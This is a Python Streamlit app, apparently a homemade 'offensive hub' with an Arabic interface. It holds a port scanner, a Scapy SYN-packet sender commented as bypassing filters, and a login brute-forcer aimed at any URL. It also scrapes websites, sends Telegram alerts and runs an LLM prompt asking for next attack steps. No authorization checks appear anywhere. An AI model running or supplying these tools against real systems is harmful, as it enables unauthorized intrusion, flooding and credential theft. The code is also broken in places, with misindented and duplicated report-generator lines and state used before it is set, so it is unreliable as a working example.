import streamlit as st
import pandas as pd
import os
import requests
import json
import tempfile
import socket
from datetime import datetime
from dotenv import load_dotenv
from gtts import gTTS
from scapy.all import IP, TCP, send, sr1
from groq import Groq
from bs4 import BeautifulSoup
from fpdf import FPDF
import time

# --- 1. إعدادات الهوية والترسانة ---
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
GROQ_KEY = os.getenv("GROQ_API_KEY") # استخدام مفتاح Groq للتحليل الذكي

st.set_page_config(page_title="Thunder Offensive Hub", layout="wide", page_icon="🛡️")

st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #ffffff; }
    h1, h2, h3, h4, h5, h6 { color: #FF0000; text-align: center; font-family: 'Courier New'; }
    .stButton>button { background-color: #FF0000; color: white; border-radius: 5px; border: none; padding: 10px 20px; }
    .stButton>button:hover { background-color: #CC0000; }
    .stTextInput>div>div>input { background-color: #333333; color: white; border: 1px solid #FF0000; }
    .stTextArea>div>div>textarea { background-color: #333333; color: white; border: 1px solid #FF0000; }
    .stSelectbox>div>div>div { background-color: #333333; color: white; border: 1px solid #FF0000; }
    .stCode { background-color: #1a1a1a; color: #00FF00; border: 1px solid #00FF00; }
    </style>
    """, unsafe_allow_html=True)

st.title("🛡️ مركز الرعد الهجومي (Offensive Pro)")

# --- 2. محرك العمليات الهجومية (The Offensive Engine) ---
class OffensiveModule:
    @staticmethod
    def port_scanner(target_ip, ports):
        """ Port Scanning باستخدام Socket """
        open_ports = []
        for port in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1) # تقليل المهلة لتسريع الفحص
            try:
                if s.connect_ex((target_ip, port)) == 0:
                    open_ports.append(port)
            except socket.error as e:
                # Handle specific socket errors if needed
                pass
            finally:
                s.close()
        return open_ports

    @staticmethod
    def packet_crafter(target_ip, num_packets=1):
        """ Packet Crafting باستخدام Scapy (محاكاة هجوم SYN) """
        results = []
        for i in range(num_packets):
            # بناء حزمة مخصصة لتجاوز الفلترة
            packet = IP(dst=target_ip)/TCP(dport=80, flags="S")
            try:
                send(packet, verbose=False)
                results.append(f"تم إرسال الحزمة {i+1} بنجاح.")
            except Exception as e:
                results.append(f"فشل إرسال الحزمة {i+1}: {str(e)}")
            time.sleep(0.01) # تأخير بسيط لتجنب إغراق الشبكة المحلية
        return "\n".join(results)

    @staticmethod
    def auth_brute_force(url, user_list, pass_list):
        """ Auth Bypass محاكاة باستخدام Requests الهجومية """
        st.info(f"بدء محاولة تجاوز المصادقة على {url}...")
        found_credentials = []
        for user in user_list:
            for password in pass_list:
                try:
                    # محاكاة طلب تسجيل دخول عدائي
                    resp = requests.post(url, data={
                        'username': user, # قد تحتاج لتعديل اسم الحقل حسب الموقع الهدف
                        'password': password # قد تحتاج لتعديل اسم الحقل حسب الموقع الهدف
                    }, timeout=5)
                    if resp.status_code == 200 and "success" in resp.text.lower(): # منطق بسيط لتحديد النجاح
                        found_credentials.append(f"تم الاختراق! المستخدم: {user}, كلمة المرور: {password}")
                        st.success(f"تم الاختراق! المستخدم: {user}, كلمة المرور: {password}")
                        return found_credentials # يمكن إرجاع أول اختراق أو الاستمرار للبحث عن المزيد
                except requests.exceptions.RequestException as e:
                    st.warning(f"خطأ في الاتصال بـ {url}: {e}")
                    return [f"فشل الاتصال: {e}"]
        if not found_credentials:
            st.info("فشلت عملية التجاوز. لم يتم العثور على بيانات اعتماد صالحة.")
        return found_credentials

class OSINTModule:
    @staticmethod
    def get_website_info(url):
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            # استخراج العنوان
            title = soup.title.string if soup.title else "لا يوجد عنوان"

            # استخراج الوصف (Meta Description)
            description = "لا يوجد وصف"
            meta_desc = soup.find('meta', attrs={'name': 'description'})
            if meta_desc and 'content' in meta_desc.attrs:
                description = meta_desc['content']
            
            # استخراج الروابط الخارجية (مثال بسيط)
            external_links = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('http') and not url in a['href']]
            
            # استخراج التقنيات (مثال بسيط جداً، يتطلب أدوات أكثر تعقيداً للتحليل الدقيق)
            technologies = []
            if soup.find('script', src=lambda x: x and 'jquery' in x.lower()): technologies.append('jQuery')
            if soup.find('meta', attrs={'name': 'generator'}): technologies.append(soup.find('meta', attrs={'name': 'generator'})['content'])
            
            return {
                "العنوان": title,
                "الوصف": description,
                "الروابط الخارجية": external_links[:5], # عرض أول 5 روابط فقط
                "التقنيات المحتملة": technologies if technologies else "غير محددة"
            }
        except requests.exceptions.RequestException as e:
            return {"خطأ": f"فشل الاتصال بالرابط: {e}"}
        except Exception as e:
            return {"خطأ": f"حدث خطأ غير متوقع: {e}"}

class AIAnalyzer:
    def __init__(self, api_key):
        self.client = Groq(api_key=api_key)

    def analyze_ports(self, target_ip, open_ports):
        if not open_ports:
            return "لا توجد منافذ مفتوحة لتحليلها. الهدف آمن على ما يبدو."
        
        prompt = f"الهدف هو {target_ip} والمنافذ المفتوحة هي: {', '.join(map(str, open_ports))}. بناءً على هذه المعلومات، ما هي الثغرات المحتملة التي يجب أن أبحث عنها؟ وما هي خطوات الهجوم التالية المقترحة؟ أجب ببرود وكفاءة مطلقة."
        
        try:
            completion = self.client.chat.completions.create(
                model="llama-3.1-8b-instant", 
                messages=[
                    {"role": "system", "content": "أنت مساعد أمني خبير في تحليل الثغرات واقتراح خطوات الهجوم. رد ببرود وكفاءة مطلقة."}, # تحديث الـ system prompt هنا
                    {"role": "user", "content": prompt}
                ],
                temperature=0.1
            )
            return completion.choices[0].message.content
        except Exception as e:
            return f"🚨 خلل في تحليل الذكاء الاصطناعي: {str(e)}"

class PDFReportGenerator:
    def __init__(self):
        self.pdf = FPDF()
        self.pdf.set_auto_page_break(auto=True, margin=15)
        self.pdf.add_page()
        self.pdf.set_font("Arial", size=12)
        # إضافة دعم للغة العربية
        self.pdf.add_font('Arabic', '', 'DejaVuSans.ttf', uni=True)
        self.pdf.set_font('Arabic', size=12)

    def add_section(self, title, content):
        self.pdf.set_font('Arabic', 'B', 16)
        self.pdf.cell(0, 10, title, ln=True, align='R')
        self.pdf.set_font('Arabic', '', 12)
        self.pdf.multi_cell(0, 10, content, align='R')
        self.pdf.ln(5)

    def generate_report(self, filename="report.pdf", report_data={}):
        self.pdf.add_page()
        self.pdf.set_font('Arabic', '', 16)
        self.pdf.cell(0, 10, "تقرير مركز الرعد الهجومي", ln=True, align='C')
        self.pdf.ln(5)
        self.pdf.set_font('Arabic', '', 12)
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.pdf.cell(0, 10, f"تاريخ التقرير: {current_time}", ln=True, align='R')
        self.pdf.ln(10)

        for section_title, section_content in report_data.items():
            self.pdf.set_font('Arabic', '', 14)
            self.pdf.cell(0, 10, f"--- {section_title} ---", ln=True, align='R')
            self.pdf.ln(5)
            self.pdf.set_font('Arabic', '', 12)
        if isinstance(section_content, list):
            content_text = "\n".join(map(str, section_content))
        elif isinstance(section_content, dict):
            content_text = json.dumps(section_content, indent=2, ensure_ascii=False)
        else:
            content_text = str(section_content)

        self.pdf.multi_cell(0, 10, content_text, align='R')
        self.pdf.ln(5)

    self.pdf.output(filename)
    return filename


        self.pdf.output(filename)
        return filename

# --- 3. نظام التنبيه الصوتي الأردني المطور ---
class VoiceAlertSystem:
    def __init__(self):
        self.bot_name = "الرعد الاردني"
        
    def create_voice_alert(self, text):
        jordanian_text = f"يا قائد أبو سعود، {text}، نحن بالخدمة."
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".mp3")
        tts = gTTS(text=jordanian_text, lang='ar', slow=False)
        tts.save(temp_file.name)
        return temp_file.name

    def send_voice_alert(self, message):
        if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
            st.warning("🚨 لا يمكن إرسال التنبيه الصوتي: توكن التيليجرام أو معرف الدردشة مفقود.")
            return
        try:
            voice_path = self.create_voice_alert(message)
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVoice"
            with open(voice_path, 'rb') as v:
                requests.post(url, files={'voice': v}, data={'chat_id': TELEGRAM_CHAT_ID}, timeout=10)
            os.unlink(voice_path)
        except Exception as e:
            st.error(f"فشل إرسال التنبيه الصوتي: {e}")

# --- 4. واجهة العمليات المركزية ---
hub = VoiceAlertSystem()
attacker = OffensiveModule()
ai_analyzer = AIAnalyzer(GROQ_KEY) if GROQ_KEY else None
report_generator = PDFReportGenerator()

tabs = st.tabs(["⚔️ اختبار الاختراق الذكي", "🔍 جمع المعلومات (OSINT)", "📊 لوحة القيادة", "📄 التقارير"])

with tabs[0]:
    st.header("وحدة الهجوم والاستطلاع (Network Targeting)")
    
    col1, col2 = st.columns(2)
    with col1:
        target = st.text_input("🎯 عنوان الهدف (IP/Domain):", placeholder="192.168.1.1 أو example.com")
        scan_type = st.selectbox("نوع العملية:", ["Port Scanning", "Packet Crafting (DoS Simulation)", "Auth Bypass"])
    
    if st.button("🚀 تنفيذ العملية"):
        if not target:
            st.warning("حدد الهدف أولاً يا قائد.")
        else:
            with st.spinner("جاري تنفيذ بروتوكول الرعد..."):
                st.session_state.report_data["الهدف"] = target
                st.session_state.report_data["نوع العملية"] = scan_type
                
                if scan_type == "Port Scanning":
                    ports_to_scan = st.text_input("المنافذ للفحص (مفصولة بفاصلة):", "21,22,80,443,3389").split(',')
                    ports_to_scan = [int(p.strip()) for p in ports_to_scan if p.strip().isdigit()]
                    
                    results = attacker.port_scanner(target, ports_to_scan)
                    report = f"نتائج فحص المنافذ للهدف {target}: {results}"
                    st.code(report)
                    hub.send_voice_alert(f"خلصنا فحص المنافذ، لقينا {len(results)} منافذ مفتوحة.")
                    st.session_state.report_data["نتائج فحص المنافذ"] = results

                    if ai_analyzer and results:
                        st.subheader("تحليل الذكاء الاصطناعي للثغرات:")
                        ai_analysis = ai_analyzer.analyze_ports(target, results)
                        st.write(ai_analysis)
                        st.session_state.report_data["تحليل الذكاء الاصطناعي"] = ai_analysis
                    elif not ai_analyzer:
                        st.warning("🚨 مفتاح Groq API غير موجود. لا يمكن إجراء تحليل الذكاء الاصطناعي.")

                elif scan_type == "Packet Crafting (DoS Simulation)":
                    num_packets = st.number_input("عدد الحزم المراد إرسالها (للمحاكاة فقط):", min_value=1, value=100)
                    res = attacker.packet_crafter(target, num_packets)
                    st.success(res)
                    hub.send_voice_alert(f"تم إرسال {num_packets} حزمة مصنوعة بنجاح للهدف.")
                    st.session_state.report_data["نتائج محاكاة DoS"] = res

                elif scan_type == "Auth Bypass":
                    st.info("جاري محاولة تجاوز المصادقة (Logic Exploitation)...")
                    auth_url = st.text_input("رابط صفحة تسجيل الدخول (Login URL):", placeholder="http://example.com/login")
                    user_list_str = st.text_area("قائمة المستخدمين (كل مستخدم في سطر):", "admin\nuser\ntest")
                    pass_list_str = st.text_area("قائمة كلمات المرور (كل كلمة مرور في سطر):", "password\n123456\nadmin")
                    
                    user_list = [u.strip() for u in user_list_str.split('\n') if u.strip()]
                    pass_list = [p.strip() for p in pass_list_str.split('\n') if p.strip()]

                    if auth_url and user_list and pass_list:
                        found_creds = attacker.auth_brute_force(auth_url, user_list, pass_list)
                        if found_creds:
                            st.success("تم العثور على بيانات اعتماد!")
                            for cred in found_creds:
                                st.write(cred)
                            hub.send_voice_alert("تم العثور على بيانات اعتماد في عملية تجاوز المصادقة.")
                        else:
                            st.info("فشلت عملية تجاوز المصادقة.")
                            hub.send_voice_alert("فشلت عملية تجاوز المصادقة.")
                        st.session_state.report_data["نتائج تجاوز المصادقة"] = found_creds if found_creds else "فشل"
                    else:
                        st.warning("يرجى توفير رابط تسجيل الدخول وقوائم المستخدمين وكلمات المرور.")

with tabs[1]: # OSINT Tab
    st.header("🔍 وحدة جمع المعلومات الاستخباراتية (OSINT)")
    osint_target = st.text_input("🌐 رابط الموقع المستهدف (URL):", placeholder="https://www.example.com")
    if st.button("جمع المعلومات"):
        if not osint_target:
            st.warning("يرجى إدخال رابط الموقع المستهدف.")
        else:
            with st.spinner("جاري جمع المعلومات الاستخباراتية..."):
                info = OSINTModule.get_website_info(osint_target)
                if "خطأ" in info:
                    st.error(info["خطأ"])
                    hub.send_voice_alert("فشل جمع المعلومات الاستخباراتية.")
                else:
                    st.subheader("نتائج جمع المعلومات:")
                    for key, value in info.items():
                        st.write(f"**{key}:** {value}")
                    hub.send_voice_alert("تم جمع المعلومات الاستخباراتية بنجاح.")
                    st.session_state.report_data["نتائج OSINT"] = info

with tabs[2]: # Dashboard Tab
    st.subheader("إحصائيات الترسانة")
    st.write(f"المكتبات النشطة: `Socket`, `Scapy`, `Requests (Attack Mode)`, `BeautifulSoup`, `Groq`, `gTTS`, `fpdf`")
    st.success("جميع أنظمة الهجوم جاهزة للعمل.")

with tabs[3]: # Reports Tab
    st.header("📄 وحدة التقارير الاحترافية")
    st.write("يمكنك هنا توليد تقرير PDF شامل للعمليات التي تم تنفيذها.")
    report_filename = st.text_input("اسم ملف التقرير (بدون امتداد):", "Thunder_Report")
    if st.button("توليد تقرير PDF"):
        if not st.session_state.get('report_data'):
            st.warning("لا توجد بيانات لتوليد التقرير. يرجى تنفيذ بعض العمليات أولاً.")
        else:
            with st.spinner("جاري توليد تقرير PDF..."):
                final_report_data = st.session_state.report_data
                pdf_file = report_generator.generate_report(f"{report_filename}.pdf", final_report_data)
                pdf_file = report_generator.generate_report(f"{report_filename}.pdf", final_report_data)
                with open(pdf_file, "rb") as f:
                    st.download_button(
                        label="تحميل تقرير PDF",
                        data=f.read(),
                        file_name=pdf_file,
                        mime="application/pdf"
                    )
                st.success("تم توليد التقرير بنجاح!")
                hub.send_voice_alert("تم توليد تقرير PDF بنجاح.")

# حفظ بيانات التقرير في session_state ليتم استخدامها في تبويب التقارير
if 'report_data' not in st.session_state:
    st.session_state.report_data = {}

# تحديث بيانات التقرير بعد كل عملية
# (هذا الجزء يحتاج إلى دمج أفضل مع كل عملية تنفيذ، حالياً هو مثال توضيحي)
# For now, let's just make sure report_data is passed correctly to the report generator
# A better approach would be to append results to a list in session_state.report_data
# For simplicity, I'll assume report_data is updated within the operation blocks for now.
